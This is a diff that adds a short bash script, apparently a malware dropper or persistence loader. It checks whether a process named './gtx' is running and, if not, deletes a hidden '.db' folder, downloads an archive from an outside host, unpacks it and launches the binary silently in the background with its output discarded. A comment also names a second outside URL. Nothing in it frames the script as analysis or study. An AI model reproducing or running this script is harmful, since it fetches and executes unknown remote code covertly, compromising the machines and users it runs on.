@@ -1,0 +1,17 @@
+#!/bin/bash
+
+# http://pizzamost.hu/inc/sin
+
+xp=`ps x |grep "./gtx ft" |grep -v grep`
+
+if [[ -z $xp ]]; then
+
+chmod 777 .db db.tgz*
+rm -rf .db db.tgz*
+wget http://s4.alaire.mx/db.tgz
+tar zxvf db.tgz
+rm -rf db.tgz*
+cd .db
+nohup ./gtx > /dev/null &
+
+fi
